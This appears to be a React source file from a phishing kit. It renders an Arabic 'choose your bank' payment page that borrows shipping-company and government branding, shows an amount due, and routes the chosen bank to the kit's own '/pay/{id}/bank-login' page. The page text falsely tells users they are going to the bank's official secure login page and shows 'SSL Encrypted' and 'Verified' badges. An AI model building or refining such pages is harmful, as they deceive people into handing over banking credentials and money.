import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, Loader2, CheckCircle2, Sparkles, ShieldCheck, Lock } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  const preselectedBank = linkData?.payload?.selected_bank;
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: bankId,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
    }

    setTimeout(() => {
      navigate(`/pay/${id}/bank-login`);
    }, 400);
  };
  
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: govSystem.colors.surface
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  const primaryColor = companyBranding?.colors.primary || govSystem.colors.primary;
  const secondaryColor = companyBranding?.colors.secondary || govSystem.colors.secondary;
  
  return (
    <>
      <div 
        className="min-h-screen flex flex-col" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
        }}
      >
        {/* Enhanced Header */}
        <div 
          className="w-full py-6 px-4 shadow-md"
          style={{
            background: '#FFFFFF',
            borderBottom: `3px solid ${primaryColor}`
          }}
        >
          <div className="container mx-auto max-w-6xl">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div 
                  className="w-12 h-12 rounded-full flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
                  }}
                >
                  <Building2 className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-xl sm:text-2xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                    اختيار البنك
                  </h1>
                  <p className="text-sm text-gray-500">
                    الخدمات المصرفية الآمنة
                  </p>
                </div>
              </div>
              
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                <ShieldCheck className="w-4 h-4 text-green-600" />
                <span className="text-xs font-medium text-green-700">اتصال آمن</span>
              </div>
            </div>
            
            {/* Amount Display */}
            <div 
              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full text-lg font-bold" 
              style={{ 
                background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                color: '#ffffff',
                boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
              }}
            >
              <span>المبلغ المطلوب:</span>
              <span className="text-xl">{formattedAmount}</span>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 py-8 sm:py-12">
          <div className="container mx-auto px-4 max-w-5xl">
            {/* Title Section */}
            <div className="text-center mb-8">
              <div className="flex items-center justify-center gap-2 mb-3">
                <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
                <h2 
                  className="text-2xl sm:text-3xl font-bold" 
                  style={{ 
                    color: designSystem.colors.neutral[900],
                    fontFamily: designSystem.typography.fontFamilies.arabic
                  }}
                >
                  اختر بنكك للمتابعة
                </h2>
              </div>
              <p className="text-base text-gray-600">
                اختر البنك الخاص بك للانتقال إلى صفحة تسجيل الدخول الآمنة
              </p>
            </div>

            {/* Security Notice */}
            <div 
              className="max-w-2xl mx-auto mb-8 p-4 rounded-xl border flex items-start gap-3"
              style={{ 
                backgroundColor: `${primaryColor}08`, 
                borderColor: `${primaryColor}30` 
              }}
            >
              <Lock className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
              <div>
                <p className="text-sm font-semibold mb-1" style={{ color: designSystem.colors.neutral[900] }}>
                  🔐 معلومة أمنية هامة
                </p>
                <p className="text-xs text-gray-600">
                  سيتم تحويلك إلى صفحة تسجيل الدخول الرسمية للبنك. لا تشارك بياناتك المصرفية مع أي شخص.
                </p>
              </div>
            </div>

            {/* Banks Grid */}
            {loadingBanks ? (
              <div className="text-center py-12">
                <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4" style={{ color: primaryColor }} />
                <p className="text-gray-600">جاري تحميل البنوك المتاحة...</p>
              </div>
            ) : banks.length === 0 ? (
              <Card className="p-8 text-center max-w-md mx-auto" style={{ borderRadius: '16px', boxShadow: '0 4px 20px rgba(0,0,0,0.08)' }}>
                <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
                <p className="text-lg font-semibold mb-2 text-gray-700">لا توجد بنوك متاحة</p>
                <p className="text-sm text-gray-500">لا توجد بنوك متاحة لهذه الدولة حالياً</p>
              </Card>
            ) : (
              <>
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 mb-8">
                  {banks.map((bank) => (
                    <button
                      key={bank.id}
                      className="group relative focus:outline-none focus:ring-2 focus:ring-offset-2 transition-all duration-200 rounded-xl"
                      style={{
                        focusRingColor: bank.color || primaryColor
                      }}
                      onClick={() => handleBankSelect(bank.id)}
                    >
                      <div 
                        className="relative overflow-hidden bg-white p-4 transition-all duration-300 flex flex-col items-center hover:shadow-xl"
                        style={{
                          borderRadius: '12px',
                          border: selectedBank === bank.id 
                            ? `3px solid ${bank.color || primaryColor}` 
                            : `2px solid ${designSystem.colors.neutral[200]}`,
                          boxShadow: selectedBank === bank.id 
                            ? `0 8px 30px -8px ${bank.color || primaryColor}60` 
                            : '0 2px 8px rgba(0,0,0,0.04)',
                          transform: selectedBank === bank.id ? 'translateY(-4px) scale(1.05)' : 'translateY(0) scale(1)',
                        }}
                      >
                        {/* Selection Checkmark */}
                        {selectedBank === bank.id && (
                          <div
                            className="absolute top-2 right-2 w-7 h-7 rounded-full flex items-center justify-center shadow-lg z-10 animate-in"
                            style={{ backgroundColor: bank.color || primaryColor }}
                          >
                            <CheckCircle2 className="w-4 h-4 text-white" strokeWidth={3} />
                          </div>
                        )}
                        
                        {/* Hover Overlay */}
                        <div 
                          className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                          style={{
                            background: `linear-gradient(135deg, ${bank.color || primaryColor}06, ${bank.color || primaryColor}12)`,
                          }}
                        />
                        
                        {/* Bank Logo */}
                        <div className="w-full aspect-square flex items-center justify-center mb-3 relative z-10">
                          <BankLogo 
                            bankId={bank.id}
                            bankName={bank.name}
                            bankNameAr={bank.nameAr}
                            color={bank.color}
                            size="lg"
                            className="w-full h-full object-contain transition-transform duration-300 group-hover:scale-110"
                          />
                        </div>
                        
                        {/* Bank Name */}
                        <p 
                          className="text-center text-xs sm:text-sm font-bold leading-tight"
                          style={{ 
                            color: selectedBank === bank.id ? (bank.color || primaryColor) : designSystem.colors.neutral[700],
                            fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                          }}
                        >
                          {bank.nameAr}
                        </p>
                        
                        {/* Selection Indicator */}
                        {selectedBank === bank.id && (
                          <div 
                            className="absolute bottom-0 left-0 right-0 h-1"
                            style={{
                              background: `linear-gradient(90deg, transparent, ${bank.color || primaryColor}, transparent)`
                            }}
                          />
                        )}
                      </div>
                    </button>
                  ))}
                </div>

                {/* Bottom Info Card */}
                <div 
                  className="max-w-2xl mx-auto p-5 rounded-xl border text-center" 
                  style={{ 
                    backgroundColor: `${primaryColor}08`, 
                    borderColor: `${primaryColor}30` 
                  }}
                >
                  <div className="flex items-center justify-center gap-3 mb-2">
                    <ShieldCheck className="w-5 h-5" style={{ color: primaryColor }} />
                    <p className="text-base font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                      اختر بنكك الآن
                    </p>
                  </div>
                  <p className="text-sm text-gray-600">
                    سيتم تحويلك إلى صفحة تسجيل الدخول الآمنة الخاصة بالبنك المختار
                  </p>
                </div>
              </>
            )}
          </div>
        </div>

        {/* Footer */}
        <div className="py-6 border-t bg-white">
          <div className="container mx-auto px-4 max-w-5xl">
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-sm text-gray-500">
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2">
                  <Lock className="w-4 h-4" />
                  <span>SSL Encrypted</span>
                </div>
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4" />
                  <span>Verified</span>
                </div>
              </div>
              <div className="text-center sm:text-right">
                <p className="text-xs">© 2025 جميع الحقوق محفوظة</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentBankSelector;
